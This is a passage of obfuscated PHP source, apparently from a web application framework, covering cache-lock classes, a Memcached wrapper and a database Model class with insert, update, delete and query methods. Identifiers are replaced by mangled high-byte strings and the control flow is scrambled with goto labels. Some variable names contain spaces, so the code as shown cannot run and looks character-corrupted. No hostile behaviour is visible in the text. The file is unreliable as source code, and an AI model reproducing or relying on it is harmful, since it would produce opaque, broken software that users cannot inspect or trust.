$»®ÅÉï∫[$ÿﬂÛ“ﬁ™] = $†Ë∫Ë‡˝; } $ã∂Ö≤‹£ = array(); $®£ÔÿÑ‡ = array($‘Æ–ıù®[1212] => $‘Æ–ıù®[1226], $‘Æ–ıù®[401] => $‘Æ–ıù®[1227]); $…ÿ”ı·¡ = $Èõ¶ë‡© = $‘Æ–ıù®[12]; foreach ($Ïﬂ—¿≤Â as $∏•Ç˝»˚) { if ($∏•Ç˝»˚[$‘Æ–ıù®[67]] == $‘Æ–ıù®[101]) { $…ÿ”ı·¡ = $∏•Ç˝»˚[$‘Æ–ıù®[32]]; } $ƒ—ïå‡‰ = $∏•Ç˝»˚[$‘Æ–ıù®[33]]; if ($ƒ—ïå‡‰ == $‘Æ–ıù®[1228] && isset($»®ÅÉï∫[$∏•Ç˝»˚[$‘Æ–ıù®[32]]])) { $ƒ—ïå‡‰ = $‘Æ–ıù®[1229]; } $÷ƒ∫©’« = array($‘Æ–ıù®[472] . $∏•Ç˝»˚[$‘Æ–ıù®[32]] . $‘Æ–ıù®[472], _get($®£ÔÿÑ‡, $ƒ—ïå‡‰, $ƒ—ïå‡‰), $∏•Ç˝»˚[$‘Æ–ıù®[35]] == $‘Æ–ıù®[101] ? $‘Æ–ıù®[1217] : $‘Æ–ıù®[1230] . $∏•Ç˝»˚[$‘Æ–ıù®[66]], $∏•Ç˝»˚[$‘Æ–ıù®[67]] == $‘Æ–ıù®[101] ? $‘Æ–ıù®[1231] : $‘Æ–ıù®[12]); $ã∂Ö≤‹£[] = trim(implode($‘Æ–ıù®[53], $÷ƒ∫©’«)); } foreach ($»®ÅÉï∫ as $ÿﬂÛ“ﬁ™ => $†Ë∫Ë‡˝) { if ($ÿﬂÛ“ﬁ™ == $‘Æ–ıù®[1206]) { $˜Üôàıë = $Èõ¶ë‡© = $‘Æ–ıù®[1232] . $…ÿ”ı·¡ . $‘Æ–ıù®[1233]; } else { $˜Üôàıë = (stripos($ÿﬂÛ“ﬁ™, $‘Æ–ıù®[11]) ? $‘Æ–ıù®[1234] : $‘Æ–ıù®[12]) . ($‘Æ–ıù®[1235] . $ÿﬂÛ“ﬁ™ . $‘Æ–ıù®[1236] . $†Ë∫Ë‡˝); } $ã∂Ö≤‹£[] = $˜Üôàıë; } if ($…ÿ”ı·¡ && !$Èõ¶ë‡©) { $ã∂Ö≤‹£ = array_merge(array($‘Æ–ıù®[1232] . $…ÿ”ı·¡ . $‘Æ–ıù®[1233]), $ã∂Ö≤‹£); } $Ã≤‚˚ë‹ = array($‘Æ–ıù®[1237] . $Û⁄€ﬂ¯¢ . $‘Æ–ıù®[1238], $‘Æ–ıù®[1239] . $Û⁄€ﬂ¯¢ . $‘Æ–ıù®[1240], implode($‘Æ–ıù®[50] . PHP_EOL, $ã∂Ö≤‹£), $‘Æ–ıù®[1241]); $˘ß¶…ıØ = implode(PHP_EOL, $Ã≤‚˚ë‹); if ($‚ √≠¨Ú && $‚ √≠¨Ú == $‘Æ–ıù®[896]) { return $˘ß¶…ıØ; } $†Éª´´˙ = array($‘Æ–ıù®[896] => $˘ß¶…ıØ, $‘Æ–ıù®[13] => $ËÁÈòËÊ); return $‚ √≠¨Ú ? $†Éª´´˙[$‚ √≠¨Ú] : $†Éª´´˙; } } goto Bä“»áÛ™¢; c•éﬁêäÁÀ: class CacheLockMemcached { public function lock($ìÍ»¨˝œ, $ÜóóàÙ∂ = 0) { $≤˙˝éùÍ = Cache::init(); $ŸÆÆÛôÀ = microtime(!0) + $ÜóóàÙ∂; while (microtime(!0) < $ŸÆÆÛôÀ) { $À¨˛ã•Ã = $≤˙˝éùÍ->get($ìÍ»¨˝œ); if (!$À¨˛ã•Ã || $À¨˛ã•Ã < microtime(!0)) { $ßæÀµ∑˝ = $≤˙˝éùÍ->handle->add($ìÍ»¨˝œ, $ŸÆÆÛôÀ, $ÜóóàÙ∂); if ($ßæÀµ∑˝) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($≤‡≥ø†Ñ) { return Cache::init()->get($≤‡≥ø†Ñ); } public function unlock($ ›ã˙µì) { return Cache::init()->remove($ ›ã˙µì); } } class CacheLockDatabase { public function lock($◊àâﬁ¬’, $„Öª¨Ë€ = 0) { $óÍ‹…ù¡ = Model($_SERVER[ˆë€Ï⁄∂][920]); $ö…Éüü© = microtime(!0) + $„Öª¨Ë€; while (microtime(!0) < $ö…Éüü©) { $¡ÅΩ≥Ÿ• = $óÍ‹…ù¡->get($◊àâﬁ¬’); if (!$¡ÅΩ≥Ÿ• || $¡ÅΩ≥Ÿ• < microtime(!0)) { $î˚¯ÔÛ» = $óÍ‹…ù¡->set($◊àâﬁ¬’, $ö…Éüü©); if ($î˚¯ÔÛ») { return !0; } } cacheLockWait(); } return !1; } public function lockGet($üÎû¬∑Ö) { return Model($_SERVER[ˆë€Ï⁄∂][920])->get($üÎû¬∑Ö); } public function unlock($‚√õÁÒ©) { Model($_SERVER[ˆë€Ï⁄∂][920])->remove($‚√õÁÒ©); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($ÅŸ‘Ñ¡é, $ÂâÅÒòÆ) { $¥ÙØ§Ã¿ =& $_SERVER[ˆë€Ï⁄∂]; if (!class_exists($¥ÙØ§Ã¿[959])) { show_json($¥ÙØ§Ã¿[960], !1); } $this->cacheTime = $ÂâÅÒòÆ; $this->handle = new Memcached(); if (is_array($ÅŸ‘Ñ¡é[$¥ÙØ§Ã¿[961]]) && count($ÅŸ‘Ñ¡é[$¥ÙØ§Ã¿[961]]) >= 1) { foreach ($ÅŸ‘Ñ¡é[$¥ÙØ§Ã¿[961]] as $˚¢Ω©Íπ) { $ïﬂÏ≈£® = explode($¥ÙØ§Ã¿[4], $˚¢Ω©Íπ); $this->handle->addServer($ïﬂÏ≈£®[0], $ïﬂÏ≈£®[1]); } } else { $this->handle->addServer($ÅŸ‘Ñ¡é[$¥ÙØ§Ã¿[218]], $ÅŸ‘Ñ¡é[$¥ÙØ§Ã¿[219]]); } } public function set($Ä‡ù¢±, $Œœﬂ’ÿ¨, $Ω∂ô“ÚÖ = false) { $Ω∂ô“ÚÖ = $Ω∂ô“ÚÖ ? $Ω∂ô“ÚÖ : $this->cacheTime; return $this->handle->set($Ä‡ù¢±, $Œœﬂ’ÿ¨, $Ω∂ô“ÚÖ); } public function get($ä’ßú·≈) { return $this->handle->get($ä’ßú·≈); } public function remove($∆–˙ãü√) { return $this->handle->delete($∆–˙ãü√); } public function deleteAll() { return $this->handle->flush(); } } goto a◊Œ≤Áì‚Ø; E÷ñ”›úı∏: define($_SERVER[ˆë€Ï⁄∂][330], 0); define($_SERVER[ˆë€Ï⁄∂][331], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\142\x6c\145", "\157\162\x64\x65\162", "\141\x6c\151\x61\163", "\x68\x61\x76\x69\x6e\x67", "\x67\162\157\x75\x70", "\x6c\x6f\143\x6b", "\x64\151\x73\164\x69\156\x63\x74", "\141\x75\164\x6f", "\x66\x69\154\x74\145\162", "\166\141\154\x69\144\x61\164\x65", "\x72\145\x73\165\x6c\164", "\x62\x69\156\x64", "\164\157\x6b\145\x6e"); public function __construct($Ä¥ÿïå‹ = '', $Ûàçá¯ = '', $Á»ê≥ıæ = '') { $Ô¬«ËÅ◊ =& $_SERVER[ˆë€Ï⁄∂]; $this->_initialize(); if (!empty($Ä¥ÿïå‹)) { if (strpos($Ä¥ÿïå‹, $Ô¬«ËÅ◊[10])) { list($this->dbName, $this->name) = explode($Ô¬«ËÅ◊[10], $Ä¥ÿïå‹); } else { $this->name = $Ä¥ÿïå‹; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($Ûàçá¯)) { $this->tablePrefix = $Ô¬«ËÅ◊[12]; } elseif ($Ô¬«ËÅ◊[12] != $Ûàçá¯) { $this->tablePrefix = $Ûàçá¯; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($Ô¬«ËÅ◊[332]); } $this->db(0, empty($this->connection) ? $Á»ê≥ıæ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $Ô˝ïÂ⁄ê =& $_SERVER[ˆë€Ï⁄∂]; if (empty($this->fields)) { if (think_config($Ô˝ïÂ⁄ê[333])) { $®–ñùòÆ = $this->dbName ? $this->dbName : think_config($Ô˝ïÂ⁄ê[334]); $≥®∑‘˛´ = think_var_cache($Ô˝ïÂ⁄ê[335] . strtolower(get_path_this($®–ñùòÆ) . $Ô˝ïÂ⁄ê[10] . $this->name)); if ($≥®∑‘˛´) { $≤éÓ·‰Ò = think_config($Ô˝ïÂ⁄ê[336]); if (empty($≤éÓ·‰Ò) || $≥®∑‘˛´[$Ô˝ïÂ⁄ê[337]] == $≤éÓ·‰Ò) { $this->fields = $≥®∑‘˛´; return; } } } $this->flush(); } } public function flush() { $˚Ö˘úº• =& $_SERVER[ˆë€Ï⁄∂]; $this->db->setModel($this->name); $“◊Í˘Èî = $this->db->getFields($this->getTableName()); if (!$“◊Í˘Èî) { return !1; } $this->fields = array_keys($“◊Í˘Èî); $this->fields[$˚Ö˘úº•[338]] = !1; foreach ($“◊Í˘Èî as $Å∑ﬁÄ≈¢ => $ñ›á‘Ê«) { $Ë∑≤ ¯°[$Å∑ﬁÄ≈¢] = $ñ›á‘Ê«[$˚Ö˘úº•[33]]; if ($ñ›á‘Ê«[$˚Ö˘úº•[39]]) { $this->fields[$˚Ö˘úº•[339]] = $Å∑ﬁÄ≈¢; if ($ñ›á‘Ê«[$˚Ö˘úº•[42]]) { $this->fields[$˚Ö˘úº•[338]] = !0; } } } $this->fields[$˚Ö˘úº•[340]] = $Ë∑≤ ¯°; if (think_config($˚Ö˘úº•[336])) { $this->fields[$˚Ö˘úº•[337]] = think_config($˚Ö˘úº•[336]); } if (think_config($˚Ö˘úº•[333])) { $õ˜„ß≈¿ = $this->dbName ? $this->dbName : think_config($˚Ö˘úº•[334]); think_var_cache($˚Ö˘úº•[335] . strtolower(get_path_this($õ˜„ß≈¿) . $˚Ö˘úº•[10] . $this->name), $this->fields); } } public function switchModel($ò°—à◊™, $‘≈«ÿΩÄ = array()) { $øê¡Ù¥– =& $_SERVER[ˆë€Ï⁄∂]; $ﬂ˘ÔÿΩ√ = ucwords(strtolower($ò°—à◊™)) . $øê¡Ù¥–[341]; if (!class_exists($ﬂ˘ÔÿΩ√)) { think_exception($ﬂ˘ÔÿΩ√ . think_lang($øê¡Ù¥–[342])); } $this->_extModel = new $ﬂ˘ÔÿΩ√($this->name); if (!empty($‘≈«ÿΩÄ)) { foreach ($‘≈«ÿΩÄ as $ÛÓò‘∞Œ) { $this->_extModel->setProperty($ÛÓò‘∞Œ, $this->{$ÛÓò‘∞Œ}); } } return $this->_extModel; } public function __set($£—ìÇ¡Ï, $‰•Ø≠ƒ¢) { $this->data[$£—ìÇ¡Ï] = $‰•Ø≠ƒ¢; } public function __get($£‹®√∞Ω) { return isset($this->data[$£‹®√∞Ω]) ? $this->data[$£‹®√∞Ω] : null; } public function __isset($‰óÁÃ£’) { return isset($this->data[$‰óÁÃ£’]); } public function __unset($Œöö Òà) { unset($this->data[$Œöö Òà]); } public function __call($Ûìã©“, $…Ÿ÷øí”) { $È˙ëÍ¨¸ =& $_SERVER[ˆë€Ï⁄∂]; if (in_array(strtolower($Ûìã©“), $this->methods, !0)) { $this->options[strtolower($Ûìã©“)] = $…Ÿ÷øí”[0]; return $this; } elseif (in_array(strtolower($Ûìã©“), array($È˙ëÍ¨¸[343], $È˙ëÍ¨¸[344], $È˙ëÍ¨¸[345], $È˙ëÍ¨¸[346], $È˙ëÍ¨¸[347]), !0)) { $‹øº˘∂¡ = isset($…Ÿ÷øí”[0]) ? $…Ÿ÷øí”[0] : $È˙ëÍ¨¸[232]; $‹øº˘∂¡ = $this->db->parseKey($‹øº˘∂¡); return $this->getField(strtoupper($Ûìã©“) . $È˙ëÍ¨¸[348] . $‹øº˘∂¡ . $È˙ëÍ¨¸[349] . $Ûìã©“, $È˙ëÍ¨¸[343]); } elseif (strtolower(substr($Ûìã©“, 0, 5)) == $È˙ëÍ¨¸[350]) { $‹øº˘∂¡ = think_parse_name(substr($Ûìã©“, 5)); $§Ã‹¡çÄ[$‹øº˘∂¡] = $…Ÿ÷øí”[0]; return $this->where($§Ã‹¡çÄ)->find(); } elseif (strtolower(substr($Ûìã©“, 0, 10)) == $È˙ëÍ¨¸[351]) { $ßÙ…á†ç = think_parse_name(substr($Ûìã©“, 10)); $§Ã‹¡çÄ[$ßÙ…á†ç] = $…Ÿ÷øí”[0]; return $this->where($§Ã‹¡çÄ)->getField($…Ÿ÷øí”[1]); } elseif (isset($this->_scope[$Ûìã©“])) { return $this->scope($Ûìã©“, $…Ÿ÷øí”[0]); } elseif (method_exists($this, $Ûìã©“)) { array_unshift($…Ÿ÷øí”, $Ûìã©“); return call_user_func_array(array($this, $È˙ëÍ¨¸[352]), $…Ÿ÷øí”); } else { return call_user_func_array(array(parent, $Ûìã©“), $…Ÿ÷øí”); } } protected function call() { $ıê∆•˜· =& $_SERVER[ˆë€Ï⁄∂]; $‘È™⁄Ä¶ = func_get_args(); $µ˚äÒ‘ = array_shift($‘È™⁄Ä¶); $¡Ó˛≥›  = $µ˚äÒ‘; if (is_array($µ˚äÒ‘)) { $¡Ó˛≥›  = $µ˚äÒ‘[1]; $µ˚äÒ‘ = $µ˚äÒ‘[0]; } $≠Û∞ΩŸÀ = count($‘È™⁄Ä¶) - 1; if (isset($‘È™⁄Ä¶[$≠Û∞ΩŸÀ]) && $‘È™⁄Ä¶[$≠Û∞ΩŸÀ] === $µ˚äÒ‘) { think_exception(__CLASS__ . $ıê∆•˜·[4] . $µ˚äÒ‘ . think_lang($ıê∆•˜·[353])); return; } $‘È™⁄Ä¶[] = $µ˚äÒ‘; if (method_exists($this, $ıê∆•˜·[354])) { $Ä›πîéÜ = call_user_func_array(array($this, $ıê∆•˜·[355]), array($¡Ó˛≥› , $‘È™⁄Ä¶)); if (!is_null($Ä›πîéÜ) && $Ä›πîéÜ !== !1) { return $Ä›πîéÜ; } } $Ω†ï¿æ≤ = call_user_func_array(array($this, $µ˚äÒ‘), $‘È™⁄Ä¶); if (method_exists($this, $ıê∆•˜·[356])) { $Ä›πîéÜ = call_user_func_array(array($this, $ıê∆•˜·[357]), array($¡Ó˛≥› , $‘È™⁄Ä¶, $Ω†ï¿æ≤)); if ($Ä›πîéÜ) { return $Ä›πîéÜ; } } return $Ω†ï¿æ≤; } protected function _initialize() { } protected function _facade($∑…É•˘Â) { $‘∞¥˙èö =& $_SERVER[ˆë€Ï⁄∂]; if (!empty($this->fields)) { foreach ($∑…É•˘Â as $¿ù˛⁄Ùı => $Ñ„äŸ∞∫) { if (is_array($this->fields) && !in_array($¿ù˛⁄Ùı, $this->fields, !0)) { unset($∑…É•˘Â[$¿ù˛⁄Ùı]); } elseif (is_scalar($Ñ„äŸ∞∫)) { $this->_parseType($∑…É•˘Â, $¿ù˛⁄Ùı); } } } if (!empty($this->options[$‘∞¥˙èö[358]])) { $∑…É•˘Â = array_map($this->options[$‘∞¥˙èö[358]], $∑…É•˘Â); unset($this->options[$‘∞¥˙èö[358]]); } $this->_beforeWrite($∑…É•˘Â); return $∑…É•˘Â; } protected function _beforeWrite(&$£Ä∫“É†) { } public function add($∞Ü˙òÇ˚ = '', $©π…•Áã = array(), $ΩË£ù•∞ = false) { if (empty($∞Ü˙òÇ˚)) { if (!empty($this->data)) { $∞Ü˙òÇ˚ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[ˆë€Ï⁄∂][359]); return !1; } } $©π…•Áã = $this->_parseOptions($©π…•Áã); $∞Ü˙òÇ˚ = $this->_facade($∞Ü˙òÇ˚); if (!1 === $this->_beforeInsert($∞Ü˙òÇ˚, $©π…•Áã)) { return !1; } $·•Ëú…Ò = $this->db->insert($∞Ü˙òÇ˚, $©π…•Áã, $ΩË£ù•∞); if (!1 !== $·•Ëú…Ò) { $Ñ∆⁄øŒ‡ = $this->getLastInsID(); if ($Ñ∆⁄øŒ‡) { $∞Ü˙òÇ˚[$this->getPk()] = $Ñ∆⁄øŒ‡; $this->_after_insert($∞Ü˙òÇ˚, $©π…•Áã); return $Ñ∆⁄øŒ‡; } $this->_after_insert($∞Ü˙òÇ˚, $©π…•Áã); } return $·•Ëú…Ò; } protected function _beforeInsert(&$ÉÊà°û˙, $ƒÿ¬„À‹) { } protected function _after_insert($›†¥ÒΩ≤, $ÁÌ®∏÷„) { } public function addAll($˛àñÒ∏å, $´¡˘ŒÖ« = array(), $†¡€∆√– = false) { $ ÉÁêÑù =& $_SERVER[ˆë€Ï⁄∂]; if (empty($˛àñÒ∏å)) { $this->error = think_lang($ ÉÁêÑù[359]); return !1; } $´¡˘ŒÖ« = $this->_parseOptions($´¡˘ŒÖ«); foreach ($˛àñÒ∏å as $¸è‘ˆ‘ê => $‘´≥Û∞ï) { $˛àñÒ∏å[$¸è‘ˆ‘ê] = $this->_facade($‘´≥Û∞ï); } if (method_exists($this->db, $ ÉÁêÑù[360])) { $öøŒ∆ã˛ = $this->db->insertAll($˛àñÒ∏å, $´¡˘ŒÖ«, $†¡€∆√–); } else { $this->startTrans(); foreach ($˛àñÒ∏å as $¸è‘ˆ‘ê => $‘´≥Û∞ï) { $öøŒ∆ã˛ = $this->db->insert($‘´≥Û∞ï, $´¡˘ŒÖ«, $†¡€∆√–); } $this->commit(); } if (!1 !== $öøŒ∆ã˛) { $≈É¸∞¯á = $this->getLastInsID(); if ($≈É¸∞¯á) { return $≈É¸∞¯á; } } return $öøŒ∆ã˛; } public function selectAdd($Ÿ≤ìÏ˙Ô = '', $–⁄œì·ï = '', $¿¨É˜õü = array()) { $˙∏˝ÙÖá =& $_SERVER[ˆë€Ï⁄∂]; $¿¨É˜õü = $this->_parseOptions($¿¨É˜õü); if (!1 === ($¯®˙Ùë‘ = $this->db->selectInsert($Ÿ≤ìÏ˙Ô ? $Ÿ≤ìÏ˙Ô : $¿¨É˜õü[$˙∏˝ÙÖá[361]], $–⁄œì·ï ? $–⁄œì·ï : $this->getTableName(), $¿¨É˜õü))) { $this->error = think_lang($˙∏˝ÙÖá[362]); return !1; } else { return $¯®˙Ùë‘; } } public function save($îªÿ¶–’ = '', $∫ÇõºÀ∑ = array()) { $Üú†û˝– =& $_SERVER[ˆë€Ï⁄∂]; if (empty($îªÿ¶–’)) { if (!empty($this->data)) { $îªÿ¶–’ = $this->data; $this->data = array(); } else { $this->error = think_lang($Üú†û˝–[359]); return !1; } } $îªÿ¶–’ = $this->_facade($îªÿ¶–’); $∫ÇõºÀ∑ = $this->_parseOptions($∫ÇõºÀ∑); $à°õÓäŸ = $this->getPk(); if (!isset($∫ÇõºÀ∑[$Üú†û˝–[363]])) { if (isset($îªÿ¶–’[$à°õÓäŸ])) { $ö’èíÔ˙[$à°õÓäŸ] = $îªÿ¶–’[$à°õÓäŸ]; $∫ÇõºÀ∑[$Üú†û˝–[363]] = $ö’èíÔ˙; unset($îªÿ¶–’[$à°õÓäŸ]); } else { $this->error = think_lang($Üú†û˝–[362]); return !1; } } if (is_array($∫ÇõºÀ∑[$Üú†û˝–[363]]) && isset($∫ÇõºÀ∑[$Üú†û˝–[363]][$à°õÓäŸ])) { $µöŸµ—˜ = $∫ÇõºÀ∑[$Üú†û˝–[363]][$à°õÓäŸ]; } if (!1 === $this->_beforeUpdate($îªÿ¶–’, $∫ÇõºÀ∑)) { return !1; } $óÄŒ”≥‚ = $this->db->update($îªÿ¶–’, $∫ÇõºÀ∑); if (!1 !== $óÄŒ”≥‚) { if (isset($µöŸµ—˜)) { $îªÿ¶–’[$à°õÓäŸ] = $µöŸµ—˜; } $this->_afterUpdate($îªÿ¶–’, $∫ÇõºÀ∑); } return $óÄŒ”≥‚; } protected function _beforeUpdate(&$Äπ‰ÄÓﬁ, $›Ÿ´´¯£) { } protected function _afterUpdate($÷ç••∑˚, $“ì“—‰˘) { } public function delete($—ßÉÑ≠è = array()) { $Ü°€¸ ° =& $_SERVER[ˆë€Ï⁄∂]; if (empty($—ßÉÑ≠è) && empty($this->options[$Ü°€¸ °[363]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $Ã˝ Ú‡Ú = $this->getPk(); if (is_numeric($—ßÉÑ≠è) || is_string($—ßÉÑ≠è)) { if (strpos($—ßÉÑ≠è, $Ü°€¸ °[50])) { $∑ÃÊ¡Ãó[$Ã˝ Ú‡Ú] = array($Ü°€¸ °[364], $—ßÉÑ≠è); } else { $∑ÃÊ¡Ãó[$Ã˝ Ú‡Ú] = $—ßÉÑ≠è; } $this->options[$Ü°€¸ °[363]] = $∑ÃÊ¡Ãó; } $—ßÉÑ≠è = $this->_parseOptions(); if (is_array($—ßÉÑ≠è[$Ü°€¸ °[363]]) && isset($—ßÉÑ≠è[$Ü°€¸ °[363]][$Ã˝ Ú‡Ú])) { $Œ◊ÑÎì˛ = $—ßÉÑ≠è[$Ü°€¸ °[363]][$Ã˝ Ú‡Ú]; } $ûøÜ∆£¶ = $this->db->delete($—ßÉÑ≠è); if (!1 !== $ûøÜ∆£¶) { $Î·óåµö = array(); if (isset($Œ◊ÑÎì˛)) { $Î·óåµö[$Ã˝ Ú‡Ú] = $Œ◊ÑÎì˛; } $this->_after_delete($Î·óåµö, $—ßÉÑ≠è); } return $ûøÜ∆£¶; } protected function _after_delete($‘Ñ◊‰√Î, $Œ¡ØªÇ‡) { } public function select($Ê√è˘àÑ = array()) { $‹√Á¶–› =& $_SERVER[ˆë€Ï⁄∂]; if (is_string($Ê√è˘àÑ) || is_numeric($Ê√è˘àÑ)) { $‰®ÀÆÉÎ = $this->getPk(); if (strpos($Ê√è˘àÑ, $‹√Á¶–›[50])) { $¬÷à≤ïí[$‰®ÀÆÉÎ] = array($‹√Á¶–›[364], $Ê√è˘àÑ); } else { $¬÷à≤ïí[$‰®ÀÆÉÎ] = $Ê√è˘àÑ; } $this->options[$‹√Á¶–›[363]] = $¬÷à≤ïí; } elseif (!1 === $Ê√è˘àÑ) { $Ê√è˘àÑ = $this->_parseOptions(); return $‹√Á¶–›[365] . $this->db->buildSelectSql($Ê√è˘àÑ) . $‹√Á¶–›[366]; } $Ê√è˘àÑ = $this->_parseOptions(); $ﬁÌ€˜òﬂ = $this->db->select($Ê√è˘àÑ); if (!1 === $ﬁÌ€˜òﬂ) { return !1; } if (empty($ﬁÌ€˜òﬂ)) { return null; } $this->_afterSelect($ﬁÌ€˜òﬂ, $Ê√è˘àÑ); return $ﬁÌ€˜òﬂ; } protected function _afterSelect(&$øâÌ‹å‚, $Á·•ÆÀÏ) { } public function buildSql($üÉ£€ÖÌ = array()) { $‹©Ù¥∆° =& $_SERVER[ˆë€Ï⁄∂]; $üÉ£€ÖÌ = $this->_parseOptions($üÉ£€ÖÌ); return $‹©Ù¥∆°[365] . $this->db->buildSelectSql($üÉ£€ÖÌ) . $‹©Ù¥∆°[366]; } public function optionsValue($ó€¶¶√ö = null) { if (is_null($ó€¶¶√ö)) { return $this->options; } elseif (is_array($ó€¶¶√ö)) { $this->options = array_merge($this->options, $ó€¶¶√ö); } } protected function _parseOptions($£‹’üùÏ = array()) { $•ò…‘∑ª =& $_SERVER[ˆë€Ï⁄∂]; if (is_array($£‹’üùÏ)) { $£‹’üùÏ = array_merge($this->options, $£‹’üùÏ); } $this->options = array(); if (!isset($£‹’üùÏ[$•ò…‘∑ª[367]])) { $£‹’üùÏ[$•ò…‘∑ª[367]] = $this->getTableName(); $‘ÏÍıÙÇ = $this->fields; } else { $‘ÏÍıÙÇ = $this->getDbFields(); } if (!empty($£‹’üùÏ[$•ò…‘∑ª[368]])) { $£‹’üùÏ[$•ò…‘∑ª[367]] .= $•ò…‘∑ª[53] . $£‹’üùÏ[$•ò…‘∑ª[368]]; } $£‹’üùÏ[$•ò…‘∑ª[369]] = $this->name; if (isset($£‹’üùÏ[$•ò…‘∑ª[363]]) && is_array($£‹’üùÏ[$•ò…‘∑ª[363]]) && !empty($‘ÏÍıÙÇ) && !isset($£‹’üùÏ[$•ò…‘∑ª[370]]) && !isset($£‹’üùÏ[$•ò…‘∑ª[367]])) { foreach ($£‹’üùÏ[$•ò…‘∑ª[363]] as $≈Û†·Üæ => $ã‘¯öª¢) { $≈Û†·Üæ = trim($≈Û†·Üæ); if (in_array($≈Û†·Üæ, $‘ÏÍıÙÇ, !0)) { if (is_scalar($ã‘¯öª¢)) { $this->_parseType($£‹’üùÏ[$•ò…‘∑ª[363]], $≈Û†·Üæ); } } elseif (!is_numeric($≈Û†·Üæ) && $•ò…‘∑ª[11] != substr($≈Û†·Üæ, 0, 1) && !1 === strpos($≈Û†·Üæ, $•ò…‘∑ª[10]) && !1 === strpos($≈Û†·Üæ, $•ò…‘∑ª[348]) && !1 === strpos($≈Û†·Üæ, $•ò…‘∑ª[224]) && !1 === strpos($≈Û†·Üæ, $•ò…‘∑ª[296])) { unset($£‹’üùÏ[$•ò…‘∑ª[363]][$≈Û†·Üæ]); } } } $this->_options_filter($£‹’üùÏ); return $£‹’üùÏ; } protected function _options_filter(&$í©ıûí”) { } protected function _parseType(&$çË›„·ô, $∫ åñÌ´) { $óÀÖ‘˜≤ =& $_SERVER[ˆë€Ï⁄∂]; if (empty($this->options[$óÀÖ‘˜≤[371]][$óÀÖ‘˜≤[4] . $∫ åñÌ´])) { $¨ÒùŸë≠ = strtolower($this->fields[$óÀÖ‘˜≤[340]][$∫ åñÌ´]); if (!1 !== strpos($¨ÒùŸë≠, $óÀÖ‘˜≤[372])) { } elseif (!1 === strpos($¨ÒùŸë≠, $óÀÖ‘˜≤[373]) && !1 !== strpos($¨ÒùŸë≠, $óÀÖ‘˜≤[374])) { $çË›„·ô[$∫ åñÌ´] = intval($çË›„·ô[$∫ åñÌ´]); } elseif (!1 !== strpos($¨ÒùŸë≠, $óÀÖ‘˜≤[375]) || !1 !== strpos($¨ÒùŸë≠, $óÀÖ‘˜≤[376])) { $çË›„·ô[$∫ åñÌ´] = floatval($çË›„·ô[$∫ åñÌ´]); } elseif (!1 !== strpos($¨ÒùŸë≠, $óÀÖ‘˜≤[377])) { $çË›„·ô[$∫ åñÌ´] = (bool) $çË›„·ô[$∫ åñÌ´]; } } } public function find($¥›◊öåŸ = array()) { $¶∏˙∆àÃ =& $_SERVER[ˆë€Ï⁄∂]; if (is_numeric($¥›◊öåŸ) || is_string($¥›◊öåŸ)) { $ˆπ™™â≈[$this->getPk()] = intval($¥›◊öåŸ); $this->options[$¶∏˙∆àÃ[363]] = $ˆπ™™â≈; } $this->options[$¶∏˙∆àÃ[378]] = 1; $¥›◊öåŸ = $this->_parseOptions(); $Ÿ´¥¬Ö¢ = $this->db->select($¥›◊öåŸ); if (!1 === $Ÿ´¥¬Ö¢) { return !1; } if (empty($Ÿ´¥¬Ö¢)) { return null; } $this->data = $Ÿ´¥¬Ö¢[0]; $this->_afterFind($this->data, $¥›◊öåŸ); if (!empty($this->options[$¶∏˙∆àÃ[379]])) { return $this->returnResult($this->data, $this->options[$¶∏˙∆àÃ[379]]); } return $this->data; } protected function _afterFind(&$√„Õ§ü≠, $äﬂîáÆ‹) { } protected function returnResult($™∏èÚâ», $º£î·á¬ = '') { $ÅÅö¨÷ç =& $_SERVER[ˆë€Ï⁄∂]; if ($º£î·á¬) { if (is_callable($º£î·á¬)) { return call_user_func($º£î·á¬, $™∏èÚâ»); } switch (strtolower($º£î·á¬)) { case $ÅÅö¨÷ç[380]: return json_encode($™∏èÚâ»); case $ÅÅö¨÷ç[381]: return xml_encode($™∏èÚâ»); } } return $™∏èÚâ»; } public function parseFieldsMap($ÌöéÕ±¿, $Ìª‰ëïº = 1) { if (!empty($this->_map)) { foreach ($this->_map as $Ùå—Ÿ˝ë => $êÔÌäèƒ) { if ($Ìª‰ëïº == 1) { if (isset($ÌöéÕ±¿[$êÔÌäèƒ])) { $ÌöéÕ±¿[$Ùå—Ÿ˝ë] = $ÌöéÕ±¿[$êÔÌäèƒ]; unset($ÌöéÕ±¿[$êÔÌäèƒ]); } } else { if (isset($ÌöéÕ±¿[$Ùå—Ÿ˝ë])) { $ÌöéÕ±¿[$êÔÌäèƒ] = $ÌöéÕ±¿[$Ùå—Ÿ˝ë]; unset($ÌöéÕ±¿[$Ùå—Ÿ˝ë]); } } } } return $ÌöéÕ±¿; } public function setField($ƒªÍòîÁ, $“≥ÒíÁ = '') { if (is_array($ƒªÍòîÁ)) { $ÊÂ∂ìÙÏ = $ƒªÍòîÁ; } else { $ÊÂ∂ìÙÏ[$ƒªÍòîÁ] = $“≥ÒíÁ; } return $this->save($ÊÂ∂ìÙÏ); } public function setAdd($çáµŸ¢â, $–¯Ü”ñ¡ = 1) { $ù˛ÿ‡•‹ =& $_SERVER[ˆë€Ï⁄∂]; $»∏≠–ó¥ = $çáµŸ¢â . $ù˛ÿ‡•‹[382] . $–¯Ü”ñ¡; if ($–¯Ü”ñ¡ < 0) { $»∏≠–ó¥ = $çáµŸ¢â . $–¯Ü”ñ¡; } return $this->setField($çáµŸ¢â, array($ù˛ÿ‡•‹[383], $»∏≠–ó¥)); } public function getField($‚åÇëì¯, $»úåªúœ = null) { $Á˜≈´∆Ï =& $_SERVER[ˆë€Ï⁄∂]; $œòÆÌÓ[$Á˜≈´∆Ï[361]] = 